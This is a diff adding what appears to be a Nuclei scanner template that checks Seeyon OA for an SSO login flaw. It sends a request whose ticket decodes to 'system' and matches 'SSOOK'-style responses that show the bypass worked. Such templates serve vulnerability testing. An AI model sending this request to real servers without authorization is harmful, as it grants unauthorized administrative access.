@@ -1,0 +1,33 @@
+id: poc-local-oa-seeyon-sso-login-weixin
+
+info:
+  name: 致远OA-sso登录漏洞-weixin-system
+  author: capiton
+  severity: high
+  description: 致远OA-sso登录漏洞-weixin-system
+  reference:
+    - 
+  metadata:
+    fofa-query: unknown
+    Vulnerability-Impact: unknown
+  tags: seeyon,zhiyuan
+
+requests:
+  - raw:
+      - |-
+        GET /seeyon/login/sso?from=weixin&ticket=c3lzdGVt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SSOOK"
+          - "already SSO"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "Ssook:"
